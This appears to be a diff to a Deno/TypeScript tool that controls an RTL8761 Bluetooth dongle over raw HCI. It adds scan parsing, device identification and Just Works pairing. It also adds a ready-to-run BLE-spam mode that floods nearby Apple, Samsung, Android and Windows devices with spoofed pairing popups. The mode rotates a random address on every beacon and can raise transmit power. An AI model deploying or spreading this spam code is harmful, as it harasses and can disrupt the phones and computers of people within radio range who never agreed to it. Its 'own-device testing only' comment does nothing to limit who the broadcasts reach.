@@ -3,6 +3,10 @@
 // RESEARCH SLICE: descriptor dump + HCI Read Local Version. Nothing is written to the
 // chip except a single HCI command over the control endpoint (the standard transport).
 
+import { appearanceName, identDevice, identReady, uuidLabel, type AdvInfo } from "./ident.ts";
+// RSSI -> 0..100% signal quality, the Windows WLAN mapping: -100 dBm = 0%, -50 dBm and above = 100%
+const signalPct = (rssi: number) => Math.max(0, Math.min(100, 2 * (rssi + 100)));
+
 const fd = Number(Deno.args[0]);
 const action = Deno.env.get("BT_ACTION") ?? "desc";
 
@@ -170,7 +174,27 @@ function attRecv(timeout = 2500): Uint8Array | null {
   return null;
 }
 
-interface AdvRec { addr: Uint8Array; addrType: number; eventType: number; rssi: number; name: string }
+// Parse the AD structures in ev[p..end): local name, advertised service UUIDs (16/128-bit lists +
+// 16-bit service data), manufacturer-data company IDs. UUIDs use attUuid's text form.
+function parseAd(ev: Uint8Array, p: number, end: number) {
+  let name = "", appearance = 0; const uuids: string[] = []; const companies: number[] = [];
+  for (let q = p; q + 2 <= end;) {
+    const l = ev[q], t = ev[q + 1];
+    if (l === 0 || q + 1 + l > end) break;
+    const d = ev.subarray(q + 2, q + 1 + l);
+    if ((t === 0x09 || t === 0x08) && l > 1) name = new TextDecoder().decode(d);
+    else if (t === 0x02 || t === 0x03) for (let i = 0; i + 2 <= d.length; i += 2) uuids.push(attUuid(d.subarray(i, i + 2)));
+    else if (t === 0x06 || t === 0x07) for (let i = 0; i + 16 <= d.length; i += 16) uuids.push(attUuid(d.subarray(i, i + 16)));
+    else if (t === 0x16 && d.length >= 2) uuids.push(attUuid(d.subarray(0, 2)));
+    else if (t === 0xff && d.length >= 2) companies.push(d[0] | (d[1] << 8));
+    else if (t === 0x19 && d.length >= 2) appearance = d[0] | (d[1] << 8);
+    q += l + 1;
+  }
+  return { name, appearance, uuids, companies };
+}
+const uniq = <T,>(a: T[]) => [...new Set(a)];
+
+interface AdvRec { addr: Uint8Array; addrType: number; eventType: number; rssi: number; name: string; uuids: string[]; companies: number[] }
 // Run an LE active scan for `secs` and return records keyed by MAC (assumes patched + claimed).
 function scanCollect(secs: number): Map<string, AdvRec> {
   const ff = new Uint8Array(8).fill(0xff);
@@ -191,24 +215,23 @@ function scanCollect(secs: number): Map<string, AdvRec> {
       const addr = ev.slice(p, p + 6); p += 6;
       const mac = Array.from(addr).reverse().map(h).join(":");
       const dlen = ev[p++];
-      let name = "";
-      const adEnd = p + dlen; let q = p;
-      while (q + 2 <= adEnd) {
-        const l = ev[q], t = ev[q + 1];
-        if (l === 0) break;
-        if ((t === 0x09 || t === 0x08) && l > 1) name = new TextDecoder().decode(ev.subarray(q + 2, q + 1 + l));
-        q += l + 1;
-      }
+      const adEnd = p + dlen;
+      const ad = parseAd(ev, p, adEnd);
       p = adEnd;
       const rssi = ev[p] > 127 ? ev[p] - 256 : ev[p]; p++;
       const prev = seen.get(mac);
-      seen.set(mac, { addr, addrType, eventType, rssi, name: name || prev?.name || "" });
+      // scan responses (eventType 0x04) carry the name but not connectability — keep the ADV_* type
+      seen.set(mac, { addr, addrType, eventType: eventType === 0x04 && prev ? prev.eventType : eventType, rssi, name: ad.name || prev?.name || "",
+        uuids: uniq([...(prev?.uuids ?? []), ...ad.uuids]), companies: uniq([...(prev?.companies ?? []), ...ad.companies]) });
     }
   }
   cmdC(0x08, 0x00c, Uint8Array.from([0x00, 0x00]));                               // scan disable
   return seen;
 }
 
+// Peer address of the most recent connectTarget() connection (for SMP c1). Set below.
+let gPeerAddr = new Uint8Array(6);
+let gPeerType = 0;
 // Ensure patched, scan, pick target (BT_TARGET or strongest connectable), create the LE
 // connection and exchange MTU. Returns the connection handle or -1. `label` prefixes output.
 async function connectTarget(label: string): Promise<number> {
@@ -220,9 +243,12 @@ async function connectTarget(label: string): Promise<number> {
   const target = want ? recs.get(want) : connectable.sort((a, b) => b[1].rssi - a[1].rssi)[0]?.[1];
   out(`${label}: ${recs.size} seen, ${connectable.length} connectable\n`);
   for (const [mac, r] of connectable.sort((a, b) => b[1].rssi - a[1].rssi).slice(0, 6))
-    out(`  ${mac}  type=${r.addrType}  ${String(r.rssi).padStart(4)} dBm  ${r.name}\n`);
+    out(`  ${mac}  type=${r.addrType}  ${String(signalPct(r.rssi)).padStart(3)}%  ${r.name}\n`);
   if (!target) { out(`${label}: no connectable target${want ? " matching " + want : ""}\n`); return -1; }
-  out(`${label}: -> ${Array.from(target.addr).reverse().map(h).join(":")} (addr_type=${target.addrType})\n`);
+  gPeerAddr = Uint8Array.from(target.addr); gPeerType = target.addrType;
+  const tmac = Array.from(target.addr).reverse().map(h).join(":");
+  const tid = identDevice({ mac: tmac, ...target });
+  out(`${label}: -> ${tmac} (addr_type=${target.addrType})${tid ? "  ~ " + tid : ""}\n`);
   const cc = new Uint8Array(25);
   const dv = new DataView(cc.buffer);
   dv.setUint16(0, 0x0060, true); dv.setUint16(2, 0x0060, true); // scan interval/window
@@ -259,6 +285,42 @@ function attTxn(handle: number, req: Uint8Array, want: number): Uint8Array | nul
 }
 const attUuid = (uv: Uint8Array) =>
   uv.length === 2 ? "0x" + (uv[0] | (uv[1] << 8)).toString(16).padStart(4, "0") : Array.from(uv).reverse().map(h).join("");
+
+// --- SMP (LE Security Manager, L2CAP CID 0x0006) — LE legacy Just Works pairing ---
+const SMP_CID = 0x0006;
+// AES-128 single block = the SMP "e" function. SMP buffers are little-endian and AES is MSB-first,
+// so reverse key+input, ECB-encrypt one block (CBC with a zero IV yields ECB on block 0), reverse out.
+async function smpE(key: Uint8Array, data: Uint8Array): Promise<Uint8Array> {
+  const k = key.slice().reverse(), d = data.slice().reverse();
+  const ck = await crypto.subtle.importKey("raw", k, { name: "AES-CBC" }, false, ["encrypt"]);
+  const ct = new Uint8Array(await crypto.subtle.encrypt({ name: "AES-CBC", iv: new Uint8Array(16) }, ck, d));
+  return ct.slice(0, 16).reverse();
+}
+const xor16 = (a: Uint8Array, b: Uint8Array) => { const o = new Uint8Array(16); for (let i = 0; i < 16; i++) o[i] = a[i] ^ b[i]; return o; };
+// Confirm value c1 (Vol 3 Part H 2.2.3). preq/pres = the 7-byte pairing req/rsp PDUs; ia/ra = 6-byte
+// addresses as carried on air (little-endian); iat/rat = address types. Follows BlueZ smp_c1 layout.
+async function smpC1(k: Uint8Array, r: Uint8Array, preq: Uint8Array, pres: Uint8Array, iat: number, rat: number, ia: Uint8Array, ra: Uint8Array): Promise<Uint8Array> {
+  const p1 = new Uint8Array(16); p1[0] = iat; p1[1] = rat; p1.set(preq.subarray(0, 7), 2); p1.set(pres.subarray(0, 7), 9);
+  const p2 = new Uint8Array(16); p2.set(ra.subarray(0, 6), 0); p2.set(ia.subarray(0, 6), 6);
+  return await smpE(k, xor16(await smpE(k, xor16(r, p1)), p2));
+}
+// STK function s1 (Vol 3 Part H 2.2.4): e(k, r2[0..7] || r1[0..7]); called as s1(TK, Srand, Mrand).
+async function smpS1(k: Uint8Array, r1: Uint8Array, r2: Uint8Array): Promise<Uint8Array> {
+  const r = new Uint8Array(16); r.set(r2.subarray(0, 8), 0); r.set(r1.subarray(0, 8), 8);
+  return await smpE(k, r);
+}
+// read the next SMP-channel (CID 0x0006) PDU, skipping other CIDs
+function smpRecv(timeout = 3000): Uint8Array | null {
+  const t0 = Date.now();
+  while (Date.now() - t0 < timeout) { const r = aclRecv(600); if (r && r.cid === SMP_CID && r.payload.length) return r.payload; }
+  return null;
+}
+// wait for a plain HCI event (not LE Meta) with the given event code on EP 0x81
+function waitEvent(code: number, timeoutMs: number): Uint8Array {
+  const t0 = Date.now();
+  while (Date.now() - t0 < timeoutMs) { const ev = readEvent(500); if (ev.length >= 2 && ev[0] === code) return ev; }
+  return new Uint8Array(0);
+}
 
 interface Svc { start: number; end: number; uuid: string }
 function discoverServices(handle: number): Svc[] {   // Read_By_Group_Type, Primary Service 0x2800
@@ -477,11 +539,34 @@ if (action === "desc") {
   out(`scan: event_mask=${em.status} le_event_mask=${lem.status} set_params=${sp.status} set_enable=${se.status}\n`);
   let rawEvents = 0;
 
+  // BT_SCAN_SECS=0: live mode — runs until SIGTERM and streams each device line as it is heard to
+  // BT_SCAN_LIVE (a FIFO: termux-usb only hands over the callback's stdout once it exits).
   const secs = Number(Deno.env.get("BT_SCAN_SECS") ?? "5");
-  out(`scan: listening ${secs}s...\n`);
-  const seen = new Map<string, { rssi: number; name: string }>();
+  const live = secs <= 0;
+  const enc8 = new TextEncoder();
+  const liveFh = live ? Deno.openSync(Deno.env.get("BT_SCAN_LIVE") ?? "/dev/stdout", { write: true }) : null;
+  const pidFile = new URL("./.scanpid", import.meta.url).pathname;
+  const scanOff = () => {
+    try { cmdC(0x08, 0x00c, Uint8Array.from([0x00, 0x00])); } catch (_) { /* fd gone */ }  // LE_Set_Scan_Enable off
+    try { Deno.removeSync(pidFile); } catch (_) {}
+  };
+  if (live) {
+    for (const sig of ["SIGTERM", "SIGINT", "SIGHUP"] as const) {
+      try { Deno.addSignalListener(sig, () => { scanOff(); Deno.exit(0); }); } catch (_) { /* unsupported */ }
+    }
+    try { Deno.writeTextFileSync(pidFile, String(Deno.pid)); } catch (_) {} // TUI signals this pid directly to stop us
+  }
+  out(`scan: listening ${live ? "until stopped" : secs + "s"}...\n`);
+  const seen = new Map<string, AdvInfo & { rssi: number; appearance: number }>();
+  // line: "<mac>  <signal>%  <name>  [<appearance>]  ~ <ident>" — the TUI splits [..] and "~ .." off the name
+  const line = (v: AdvInfo & { rssi: number; appearance: number }) => {
+    const ap = appearanceName(v.appearance), id = identDevice(v);
+    return `  ${v.mac}  ${String(signalPct(v.rssi)).padStart(3)}%  ${v.name}${ap ? "  [" + ap + "]" : ""}${id ? "  ~ " + id : ""}\n`;
+  };
+  const sent = new Map<string, { at: number; text: string }>();   // live: last line streamed per MAC
   const t0 = Date.now();
-  while (Date.now() - t0 < secs * 1000) {
+  while (live || Date.now() - t0 < secs * 1000) {
+    if (live) await new Promise((res) => setTimeout(res, 0));     // yield so the SIGTERM listener can run
     const ev = new Uint8Array(260);
     const n = bulk(0x81, ev, 800);
     if (n > 0) rawEvents++;
@@ -490,33 +575,44 @@ if (action === "desc") {
     const num = ev[p++];
     for (let r = 0; r < num && p + 9 <= n; r++) {
       p++;                                                        // event_type
-      p++;                                                        // address_type
+      const addrType = ev[p++];
       const mac = Array.from(ev.subarray(p, p + 6)).reverse().map(h).join(":"); p += 6;
       const dlen = ev[p++];
-      let name = "";
       const adEnd = p + dlen;
-      let q = p;
-      while (q + 2 <= adEnd) {                                    // parse AD structures for name
-        const l = ev[q], t = ev[q + 1];
-        if (l === 0) break;
-        if ((t === 0x09 || t === 0x08) && l > 1) name = new TextDecoder().decode(ev.subarray(q + 2, q + 1 + l));
-        q += l + 1;
-      }
+      const ad = parseAd(ev, p, adEnd);
       p = adEnd;
       const rssi = ev[p] > 127 ? ev[p] - 256 : ev[p]; p++;        // signed
       const prev = seen.get(mac);
-      seen.set(mac, { rssi, name: name || prev?.name || "" });
+      const v = { mac, addrType, rssi, name: ad.name || prev?.name || "", appearance: ad.appearance || prev?.appearance || 0,
+        uuids: uniq([...(prev?.uuids ?? []), ...ad.uuids]), companies: uniq([...(prev?.companies ?? []), ...ad.companies]) };
+      seen.set(mac, v);
+      if (liveFh) {                                               // stream: a new MAC at once, its updates ≤1/s
+        const text = line(v), last = sent.get(mac), now = Date.now();
+        if (!last || last.text !== text && now - last.at >= 1000) { liveFh.writeSync(enc8.encode(text)); sent.set(mac, { at: now, text }); }
+      }
     }
   }
-  hciCmd(0x08, 0x00c, Uint8Array.from([0x00, 0x00]));             // LE_Set_Scan_Enable off
+  scanOff();
   const rows = [...seen.entries()].sort((a, b) => b[1].rssi - a[1].rssi);
-  out(`scan: ${rows.length} device(s) (${rawEvents} raw events)\n`);
-  for (const [mac, v] of rows) out(`  ${mac}  ${String(v.rssi).padStart(4)} dBm  ${v.name}\n`);
+  out(`scan: ${rows.length} device(s) (${rawEvents} raw events)${identReady ? "" : " — no ident db: deno run -A ident/update.ts"}\n`);
+  for (const [, v] of rows) out(line(v));
 } else if (action === "adv") {
   // LE advertise. Self-contained: downloads fw first if the chip is still in ROM.
   if (!claim(0)) { out(`adv: claim iface0 failed errno=${errno()}\n`); Deno.exit(1); }
   const sv = await ensurePatched();
   out(`adv: controller lmp_subver=0x${(sv >>> 0).toString(16)}${sv === 0x8761 ? " (STILL ROM!)" : " (patched)"}\n`);
+
+  // Stop advertising cleanly on kill, so nothing keeps beaconing after the caller (TUI) exits.
+  const pidFile = new URL("./.advpid", import.meta.url).pathname;
+  const advOff = () => {
+    try { cmdC(0x08, 0x00a, Uint8Array.from([0x00])); } catch (_) { /* fd gone */ }
+    try { cmdC(0x08, 0x0039, Uint8Array.from([0x00, 0x00])); } catch (_) {}
+    try { Deno.removeSync(pidFile); } catch (_) {}
+  };
+  for (const sig of ["SIGTERM", "SIGINT", "SIGHUP"] as const) {
+    try { Deno.addSignalListener(sig, () => { advOff(); Deno.exit(0); }); } catch (_) { /* unsupported */ }
+  }
+  try { Deno.writeTextFileSync(pidFile, String(Deno.pid)); } catch (_) {} // TUI signals this pid directly to stop us
 
   const bd = cmdC(0x04, 0x009); // Read_BD_ADDR
   const mac = bd.status === 0 && bd.ret.length >= 6
@@ -525,6 +621,69 @@ if (action === "desc") {
   // Ready-made preset catalogue (BT_ADV_PRESET): swiftpair | ibeacon | eddystone | apple | fastpair.
   const preset = (Deno.env.get("BT_ADV_PRESET") ?? "").toLowerCase();
   const name = enc.encode(Deno.env.get("BT_ADV_NAME") ?? (preset === "swiftpair" ? "hello" : "RTL8761-AW"));
+
+  // Rotating-address advertisement presets, ported verbatim from the M5/ESP32 app_spam.h. Each
+  // send: fresh random static address + fresh randomized payload, NONCONN_IND, 20ms interval.
+  // Rotating the address makes every beacon look like a new device so the target UI re-pops.
+  // FOR OWN-DEVICE TESTING ONLY.
+  const SPAM = ["apple", "samsung", "google", "windows", "all"];
+  if (SPAM.includes(preset)) {
+    const rnd = (n: number) => crypto.getRandomValues(new Uint8Array(n));
+    const pick = <T>(a: T[]): T => a[rnd(1)[0] % a.length];
+    const APPLE = [0x02, 0x0f, 0x13, 0x14, 0x0e, 0x0a, 0x03, 0x0b, 0x0c, 0x05, 0x06, 0x09, 0x10, 0x11, 0x12];
+    const SBUDS = [0xee7a0c, 0x39ea48, 0xa7c62c, 0x850116, 0x3d8f41, 0xb8b905, 0xeaaa17, 0xd30704, 0x3f6718, 0x42c519];
+    const SWATCH = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x1b, 0x1c, 0x1d, 0x1e, 0x20];
+    const FPAIR = [0x92bbbd, 0xcd8256, 0x821f66, 0xf52494, 0xd446a7, 0x2d7a23, 0x0e30c3, 0x0100f0, 0x01eeb4, 0x038f16, 0xe2106f, 0xb37a62, 0x3d45dc];
+    const SWIFT = ["MRX Device", "Free WiFi", "AirPods Pro", "Galaxy Buds", "JBL Speaker"];
+    const buildApple = (): number[] => { const r = rnd(7); return [0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, pick(APPLE), 0x20, r[1], r[2], r[3], 0x01, 0x00, 0x00, 0x45, r[4], r[5], r[6], 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]; };
+    const buildSamsung = (): number[] => {
+      if (rnd(1)[0] % 3 < 2) { const m = pick(SBUDS); return [0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, (m >> 16) & 0xff, (m >> 8) & 0xff, 0x01, m & 0xff, 0x06, 0x3c, 0x94, 0x8e, 0, 0, 0, 0, 0xc7, 0x00, 0x10, 0xff, 0x75]; }
+      return [0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, pick(SWATCH)];
+    };
+    const buildGoogle = (): number[] => { const m = pick(FPAIR); return [0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, (m >> 16) & 0xff, (m >> 8) & 0xff, m & 0xff, 0x02, 0x0a, ((rnd(1)[0] % 25) - 20) & 0xff]; };
+    const buildWindows = (): number[] => { const nm = Array.from(enc.encode(pick(SWIFT))).slice(0, 24); return [6 + nm.length, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, ...nm]; };
+
+    const secs = Number(Deno.env.get("BT_ADV_SECS") ?? "30");
+    const interval = (preset === "windows" || preset === "google") ? 100 : preset === "all" ? 150 : 200;
+    out(`adv: BLE-spam "${preset}" (rotating address) ${secs > 0 ? `for ${secs}s` : "until stopped"} — watch the target screen\n`);
+    // TX power: legacy advertising has no HCI power field, so BT_TX_POWER (dBm) switches to
+    // Extended Advertising with legacy PDUs (0x0036 has an Advertising_TX_Power octet). The
+    // controller clamps to its max and reports the value it actually selected.
+    const txpEnv = Deno.env.get("BT_TX_POWER");
+    const useExt = !!txpEnv;
+    const txp = useExt ? ((((parseInt(txpEnv!, 10) || 0) % 256) + 256) % 256) : 0;
+    if (useExt) {
+      // event_props 0x0010 = legacy PDUs, non-connectable non-scannable (ADV_NONCONN_IND).
+      const pr = cmdC(0x08, 0x0036, Uint8Array.from([0x00, 0x10, 0x00, 0x20, 0x00, 0x00, 0x20, 0x00, 0x00, 0x07, 0x01, 0x00, 0, 0, 0, 0, 0, 0, 0x00, txp, 0x01, 0x00, 0x01, 0x00, 0x00]));
+      const sel = pr.ret.length ? (pr.ret[0] > 127 ? pr.ret[0] - 256 : pr.ret[0]) : "?";
+      out(`adv: extended-adv TX power req=${parseInt(txpEnv!, 10)}dBm status=${pr.status} selected=${sel}dBm\n`);
+    }
+    const t0 = Date.now(); let n = 0;
+    while (secs <= 0 || Date.now() - t0 < secs * 1000) {     // secs<=0: manual, runs until SIGTERM
+      const brand = preset === "all" ? pick(["apple", "samsung", "google", "windows"]) : preset;
+      const pkt = brand === "apple" ? buildApple() : brand === "samsung" ? buildSamsung() : brand === "google" ? buildGoogle() : buildWindows();
+      const raddr = rnd(6); raddr[5] |= 0xc0;                              // random static address
+      const dlen = Math.min(pkt.length, 31);
+      if (useExt) {
+        cmdC(0x08, 0x0039, Uint8Array.from([0x00, 0x01, 0x00, 0x00, 0x00, 0x00]));           // ext adv enable off (set 0)
+        cmdC(0x08, 0x0035, Uint8Array.from([0x00, ...Array.from(raddr)]));                   // set advertising set random address
+        cmdC(0x08, 0x0037, Uint8Array.from([0x00, 0x03, 0x01, dlen, ...pkt.slice(0, 31)]));  // ext adv data (complete)
+        cmdC(0x08, 0x0039, Uint8Array.from([0x01, 0x01, 0x00, 0x00, 0x00, 0x00]));           // ext adv enable on
+      } else {
+        cmdC(0x08, 0x00a, Uint8Array.from([0x00]));                        // LE_Set_Advertise_Enable off
+        cmdC(0x08, 0x005, raddr);                                          // LE_Set_Random_Address
+        cmdC(0x08, 0x006, Uint8Array.from([0x20, 0x00, 0x20, 0x00, 0x03, 0x01, 0x00, 0, 0, 0, 0, 0, 0, 0x07, 0x00])); // NONCONN_IND, own=random, 20ms
+        const advd = new Uint8Array(32); advd[0] = dlen; advd.set(pkt.slice(0, 31), 1);
+        cmdC(0x08, 0x008, advd);                                          // LE_Set_Advertising_Data
+        cmdC(0x08, 0x00a, Uint8Array.from([0x01]));                        // LE_Set_Advertise_Enable on
+      }
+      n++;
+      await new Promise((res) => setTimeout(res, interval));
+    }
+    advOff();     // disable legacy + extended advertising and drop the pid file
+    out(`adv: sent ${n} rotating "${preset}" beacons${useExt ? ` (ext TX ${parseInt(txpEnv!, 10)}dBm)` : ""}. stopped.\n`);
+    Deno.exit(0);
+  }
 
   // Apple Continuity beacons are broadcast NON-connectable with NO Flags section (the host's
   // hardware-offload filter expects the manufacturer data at the front); everything else uses
@@ -552,14 +711,6 @@ if (action === "desc") {
     addAD(0x03, [0xaa, 0xfe]);                                  // Complete 16-bit Service UUIDs = Eddystone
     addAD(0x16, [0xaa, 0xfe, 0x10, 0x00, 0x03, ...Array.from(enc.encode(url))]); // Service Data: URL frame, 0x03 = https://
     label = `Eddystone-URL https://${url}`;
-  } else if (preset === "apple") {
-    // Apple Continuity "Nearby Action" (type 0x0F) — a nearby iPhone/iPad shows a setup popup.
-    // MSD: 4C 00 (Apple) | 0F (Nearby Action) | 05 (len) | action | flags | 3 random auth bytes.
-    const action = parseHex(Deno.env.get("BT_APPLE_ACTION") ?? "27")[0] ?? 0x27; // 0x27 AppleTV, 0x13 Watch, 0x20 AirPods
-    const flags = parseHex(Deno.env.get("BT_APPLE_FLAGS") ?? "00")[0] ?? 0x00;
-    const auth = crypto.getRandomValues(new Uint8Array(3));
-    addAD(0xff, [0x4c, 0x00, 0x0f, 0x05, action, flags, ...Array.from(auth)]);
-    label = `Apple Nearby Action 0x${h(action)} — watch a nearby iPhone/iPad for a popup`;
   } else if (preset === "fastpair") {
     // Google Fast Pair discoverable advert — a nearby Android shows a half-sheet. Service Data
     // 0xFE2C + 3-byte registered Model ID (big-endian). Popup depends on Google's model DB.
@@ -589,7 +740,7 @@ if (action === "desc") {
   if (handle < 0) Deno.exit(1);
   out(`connect: primary services:\n`);
   const svcs = discoverServices(handle);
-  for (const s of svcs) out(`  [0x${s.start.toString(16).padStart(4, "0")}-0x${s.end.toString(16).padStart(4, "0")}] ${s.uuid}\n`);
+  for (const s of svcs) out(`  [0x${s.start.toString(16).padStart(4, "0")}-0x${s.end.toString(16).padStart(4, "0")}] ${s.uuid}  ${uuidLabel(s.uuid)}\n`);
   out(`connect: ${svcs.length} service(s). disconnecting.\n`);
   disconnect(handle);
 } else if (action === "read") {
@@ -600,7 +751,7 @@ if (action === "desc") {
   const svcs = discoverServices(handle);
   out(`read: ${svcs.length} service(s); characteristics + values:\n`);
   for (const s of svcs) {
-    out(`  service ${s.uuid} [0x${s.start.toString(16).padStart(4, "0")}-0x${s.end.toString(16).padStart(4, "0")}]\n`);
+    out(`  service ${s.uuid} [0x${s.start.toString(16).padStart(4, "0")}-0x${s.end.toString(16).padStart(4, "0")}]  ${uuidLabel(s.uuid)}\n`);
     for (const c of discoverChars(handle, s.start, s.end)) {
       const flags = (c.props & 0x02 ? "R" : "-") + (c.props & 0x0c ? "W" : "-") + (c.props & 0x10 ? "N" : "-") + (c.props & 0x20 ? "I" : "-");
       let val = "";
@@ -609,9 +760,10 @@ if (action === "desc") {
         if (raw) {
           const asc = Array.from(raw).map((x) => x >= 0x20 && x < 0x7f ? String.fromCharCode(x) : ".").join("");
           val = `= ${Array.from(raw).map(h).join(" ")}  "${asc}"`;
+          if (c.uuid === "0x2a01" && raw.length >= 2) val += `  [${appearanceName(raw[0] | (raw[1] << 8)) || "Unknown"}]`;
         } else val = "= <read denied>";
       }
-      out(`    ${c.uuid} h=0x${c.valueHandle.toString(16).padStart(4, "0")} [${flags}] ${(GATT_NAMES[c.uuid] ?? "").padEnd(16)} ${val}\n`);
+      out(`    ${c.uuid} h=0x${c.valueHandle.toString(16).padStart(4, "0")} [${flags}] ${(GATT_NAMES[c.uuid] ?? "").padEnd(16)} ${val}${!GATT_NAMES[c.uuid] && uuidLabel(c.uuid) ? "  ~ " + uuidLabel(c.uuid) : ""}\n`);
     }
   }
   out(`read: done. disconnecting.\n`);
@@ -695,6 +847,64 @@ if (action === "desc") {
   }
   out(`notify: ${count} notification(s). unsubscribing + disconnecting.\n`);
   attWrite(handle, cccd, Uint8Array.from([0x00, 0x00]));
+  disconnect(handle);
+} else if (action === "pair") {
+  // LE legacy Just Works pairing (SMP over L2CAP CID 0x0006), then optionally read an
+  // encrypted characteristic to prove access. Peer address comes from connectTarget().
+  if (!claim(0)) { out(`pair: claim iface0 failed errno=${errno()}\n`); Deno.exit(1); }
+  const handle = await connectTarget("pair");
+  if (handle < 0) Deno.exit(1);
+  const bd = cmdC(0x04, 0x009);                                   // Read_BD_ADDR (our public address)
+  const ia = bd.ret.subarray(0, 6), iat = 0x00;                  // initiator address = public
+  const ra = gPeerAddr, rat = gPeerType;                          // responder address = peer
+  // Pairing Request: IO=NoInputNoOutput (Just Works), no OOB, AuthReq=bonding, maxKey 16, dist EncKey
+  const preq = Uint8Array.from([0x01, 0x03, 0x00, 0x01, 0x10, 0x01, 0x01]);
+  aclSend(handle, SMP_CID, preq);
+  const pres = smpRecv();
+  if (!pres || pres[0] !== 0x02) {
+    const why = pres && pres[0] === 0x05 ? ` Pairing Failed reason=0x${h(pres[1])}` : "";
+    out(`pair: no Pairing Response (${pres ? "code 0x" + h(pres[0]) + why : "timeout"})\n`); disconnect(handle); Deno.exit(1);
+  }
+  out(`pair: response io=0x${h(pres[1])} auth=0x${h(pres[3])} keysize=${pres[4]}\n`);
+  const TK = new Uint8Array(16);                                  // Just Works: TK = 0
+  const Mrand = crypto.getRandomValues(new Uint8Array(16));
+  const Mconfirm = await smpC1(TK, Mrand, preq, pres, iat, rat, ia, ra);
+  const sent = aclSend(handle, SMP_CID, Uint8Array.from([0x03, ...Array.from(Mconfirm)])); // Pairing Confirm
+  out(`  confirm sent rc=${sent}\n`);
+  let sc: Uint8Array | null = null;
+  const tSc = Date.now();
+  while (Date.now() - tSc < 6000) {
+    const ev = readEvent(150);                                    // EP 0x81: catch disconnection / LTK req
+    if (ev.length >= 3 && ev[0] === 0x05) { out(`  DISCONNECTED reason=0x${h(ev[4])}\n`); break; }
+    else if (ev.length >= 2) out(`  evt 0x${h(ev[0])} ${hex(ev, Math.min(ev.length, 8))}\n`);
+    const r = aclRecv(300);                                       // EP 0x82: ACL data
+    if (!r) continue;
+    out(`  rx cid=0x${r.cid.toString(16)} op=0x${h(r.payload[0])} len=${r.payload.length}\n`);
+    if (r.cid === SMP_CID) { sc = r.payload; break; }
+  }
+  if (!sc || sc[0] !== 0x03) { out(`pair: no Sconfirm (${sc ? "code 0x" + h(sc[0]) + (sc[0] === 0x05 ? " reason=0x" + h(sc[1]) : "") : "timeout"})\n`); disconnect(handle); Deno.exit(1); }
+  aclSend(handle, SMP_CID, Uint8Array.from([0x04, ...Array.from(Mrand)])); // Pairing Random
+  const sr = smpRecv();
+  if (!sr || sr[0] !== 0x04) { out(`pair: no Srand (${sr ? "code 0x" + h(sr[0]) : "timeout"})\n`); disconnect(handle); Deno.exit(1); }
+  const Srand = sr.subarray(1, 17);
+  const verify = await smpC1(TK, Srand, preq, pres, iat, rat, ia, ra);
+  out(`pair: Sconfirm ${verify.every((b, i) => b === sc[1 + i]) ? "verified" : "MISMATCH (c1 endianness?)"}\n`);
+  const STK = await smpS1(TK, Srand, Mrand);
+  const es = new Uint8Array(28); new DataView(es.buffer).setUint16(0, handle, true); es.set(STK, 12); // rand=0, ediv=0, ltk=STK
+  out(`pair: start_encryption status=${cmdStatus(0x08, 0x0019, es)}\n`);
+  const ec = waitEvent(0x08, 5000);                              // Encryption Change (HCI event 0x08)
+  const encrypted = ec.length >= 6 && ec[2] === 0x00 && ec[5] === 0x01;
+  out(`pair: ${encrypted ? "LINK ENCRYPTED handle=0x" + handle.toString(16) : "encryption FAILED (" + (ec.length >= 3 ? "status 0x" + h(ec[2]) : "timeout") + ")"}\n`);
+  if (encrypted) for (let i = 0; i < 4; i++) { const k = smpRecv(1200); if (!k) break; out(`  key dist: 0x${h(k[0])} (${k.length}B)\n`); }
+  const rdUuid = (Deno.env.get("BT_PAIR_READ_UUID") ?? "").toLowerCase();
+  if (encrypted && rdUuid) {
+    for (const s of discoverServices(handle)) for (const c of discoverChars(handle, s.start, s.end)) {
+      if (c.uuid.toLowerCase() === rdUuid && (c.props & 0x02)) {
+        const raw = readChar(handle, c.valueHandle);
+        out(`pair: read ${c.uuid} = ${raw ? Array.from(raw).map(h).join(" ") : "<still denied>"}\n`);
+      }
+    }
+  }
   disconnect(handle);
 } else if (action === "romver") {
   // Read ROM Version: vendor OGF=0x3f, OCF=0x06d (opcode 0xFC6D). Selects the fw patch.
